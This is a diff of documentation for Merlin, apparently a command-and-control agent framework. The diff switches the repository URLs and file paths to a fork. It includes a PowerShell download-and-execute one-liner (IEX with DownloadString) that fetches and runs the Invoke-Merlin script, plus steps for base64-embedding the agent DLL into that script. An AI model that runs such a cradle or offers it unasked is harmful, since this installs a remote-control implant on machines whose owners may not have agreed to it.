@@ -13,7 +13,7 @@ Base64 encoded version of ``merlin.dll``.
 
 An example of running the script from GitHub is:
 
-``IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ne0nd0g/merlin/master/data/bin/dll/Invoke-Merlin.ps1');Invoke-Merlin``
+``IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/yok4i/merlin/master/data/bin/dll/Invoke-Merlin.ps1');Invoke-Merlin``
 
 An example of running the script locally, using dot sourcing to read the script in, is:
 
@@ -48,6 +48,6 @@ Update DLL
 
 The following steps can be used to update the DLL in the script using PowerShell:
 
-* ``$PEBytes = [IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')``
+* ``$PEBytes = [IO.File]::ReadAllBytes('C:/Go/src/yok4i/merlin/data/bin/dll/merlin.dll')``
 * ``$Base64String = [System.Convert]::ToBase64String($PEBytes)``
 * ``(Get-Content data/bin/powershell/Invoke-Merlin.ps1) | foreach-object {$_ -replace '^\$global\:merlin \= (.*)', ('$global:merlin = ' + "'" + $Base64String + "'")} | Set-Content data/bin/powershell/Invoke-Merlin.ps1``
